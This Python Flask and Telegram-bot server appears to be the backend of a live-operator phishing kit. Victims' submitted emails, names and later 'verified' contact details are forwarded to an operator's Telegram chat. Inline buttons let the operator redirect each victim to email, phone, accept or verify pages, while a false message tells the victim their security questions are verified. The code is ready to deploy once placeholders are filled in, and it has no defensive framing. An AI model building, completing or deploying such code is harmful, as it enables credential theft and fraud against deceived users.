from flask import Flask, request, redirect
from flask_socketio import SocketIO
import uuid
import threading
import asyncio

from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CallbackQueryHandler, MessageHandler, filters

from state import user_rooms
from socket_handlers import register_socket_handlers
from telegram_handlers import button_callback, handle_greeting
from pages import PAGE_6_HTML

# CONFIG
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"
FRONTEND_URL = "https://YOUR_CLOUDFLARE_PAGES_DOMAIN"

app = Flask(__name__)
app.config["SECRET_KEY"] = "secret"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

telegram_bot = Bot(token=BOT_TOKEN)

# SINGLE EVENT LOOP
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

def run_async(coro):
    asyncio.run_coroutine_threadsafe(coro, loop)

def start_loop():
    asyncio.set_event_loop(loop)
    loop.run_forever()

threading.Thread(target=start_loop, daemon=True).start()


# ROUTES -------------------------------------------------

@app.route("/submit", methods=["POST"])
def submit():
    email = request.form.get("email")
    name = request.form.get("name")

    room_id = str(uuid.uuid4())
    user_rooms[room_id] = {
        "email": email,
        "name": name,
        "greeting": "Your security questions have been verified.",
        "expect_greeting": False
    }

    keyboard = [
        [InlineKeyboardButton("📧 EMAIL", callback_data=f"{room_id}:Page 1"),
         InlineKeyboardButton("📞 PHONE", callback_data=f"{room_id}:Page 2")],
        [InlineKeyboardButton("📝 TYPE", callback_data=f"{room_id}:Page 3"),
         InlineKeyboardButton("✅ ACCEPT", callback_data=f"{room_id}:Page 4")],
        [InlineKeyboardButton("❌📧📞", callback_data=f"{room_id}:Page 5"),
         InlineKeyboardButton("⏳ LOAD", callback_data=f"{room_id}:Page 6")],
        [InlineKeyboardButton("❌ VERIFY", callback_data=f"{room_id}:Page 7")]
    ]

    markup = InlineKeyboardMarkup(keyboard)

    run_async(telegram_bot.send_message(
        chat_id=CHAT_ID,
        text=f"🧾 New Submission\nRoom: {room_id}\nEmail: {email}\nName: {name}",
        reply_markup=markup
    ))

    # Redirect user to WAIT PAGE on frontend
    return redirect(f"{FRONTEND_URL}/wait.html?room={room_id}")


@app.route("/verify_email", methods=["POST"])
def verify_email():
    room_id = request.form.get("room_id")
    verified = request.form.get("verified_email")

    if room_id in user_rooms:
        user_rooms[room_id]["email"] = verified

    run_async(telegram_bot.send_message(
        chat_id=CHAT_ID,
        text=f"Verified\nRoom: {room_id}\nNew Email/Number: {verified}"
    ))

    return redirect(f"{FRONTEND_URL}/wait.html?room={room_id}")


# TELEGRAM BOT THREAD ----------------------------------

def start_bot():
    teleapp = ApplicationBuilder().token(BOT_TOKEN).build()
    teleapp.add_handler(CallbackQueryHandler(button_callback))
    teleapp.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_greeting))
    teleapp.run_polling()

threading.Thread(target=start_bot, daemon=True).start()

# SOCKET HANDLERS
register_socket_handlers(socketio)

# MAIN ---------------------------------------------------

if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=10000)
